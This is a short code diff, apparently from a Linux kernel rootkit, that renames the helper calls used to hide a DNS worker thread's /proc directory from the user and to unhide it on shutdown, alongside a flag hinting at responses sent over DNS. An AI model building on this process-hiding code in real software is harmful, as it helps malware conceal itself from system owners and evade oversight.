@@ -1,4 +1,4 @@
-#include "hide.h"
+#include "hide_api.h"
 #include "network.h"
 
 bool response_over_dns = false;
@@ -58,7 +58,7 @@ int start_dns_worker(void) {
     // Hide the thread from the user
     char path[32] = { 0 };
     snprintf(path, sizeof(path), "/proc/%d", dns_worker_thread->pid);
-    add_hidden_dir(path);
+    hide_file(path);
 
     return SUCCESS;
 }
@@ -80,7 +80,7 @@ int stop_dns_worker(void) {
     // Remove the hidden directory associated with the thread
     char path[32] = { 0 };
     snprintf(path, sizeof(path), "/proc/%d", dns_worker_thread->pid);
-    remove_hidden_dir(path);
+    unhide_file(path);
 
     // Stop the DNS worker thread
     kthread_stop(dns_worker_thread);
